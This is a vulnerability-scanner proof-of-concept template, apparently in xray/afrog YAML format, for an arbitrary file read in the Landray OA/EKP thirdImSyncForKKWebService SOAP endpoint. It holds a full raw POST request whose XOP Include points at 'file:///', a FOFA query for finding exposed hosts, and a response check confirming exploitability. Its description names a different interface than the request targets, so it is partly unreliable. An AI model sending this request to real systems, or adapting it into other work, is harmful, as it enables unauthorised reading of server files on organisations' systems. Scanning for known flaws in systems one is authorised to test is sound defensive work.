pocs/todo/landray-oa-thirdImSyncForKKWebService-fileread.yaml

id: landray-oa-thirdImSyncForKKWebService-fileread

info:
  name: Landray OA thirdImSyncForKKWebService File Read
  author: ZacharyZcR
  severity: high
  verified: true
  description: |
    Landray EKP System sysFormMainDataInsystemWebservice interface has an arbitrary file read vulnerability.
    FOFA: body="Com_Parameter"
  reference:
    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3sysFormMainDataInsystemWebservice%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md

set:
  rboundary: randomLowercase(8)
  hostname: request.url.host

rules:
  r0:
    request:
      raw: |-
        POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
        SOAPAction
        Content-Type: multipart/related; boundary=---------------------------{{rboundary}}
        Accept-Encoding: gzip, deflate, br
        Host: {{hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
        Content-Length: 603
        Connection: keep-alive

        -----------------------------{{rboundary}}
        Content-Disposition: form-data; name="message"; filename="asdadads.aspx"

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
        <soapenv:Header/>
        <soapenv:Body>
        <web:getTodo>
        <arg0>
            <otherCond>1</otherCond>
            <pageNo>1</pageNo> 
            <rowSize>1</rowSize> 
            <targets>1</targets>
            <type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></type>
        </arg0>
        </web:getTodo>
        </soapenv:Body>
        </soapenv:Envelope>
        -----------------------------{{rboundary}}--
    expression: |
      response.status == 500 &&
      response.body.ibcontains(b'Unmarshalling Error: Not a number')
expression: r0()
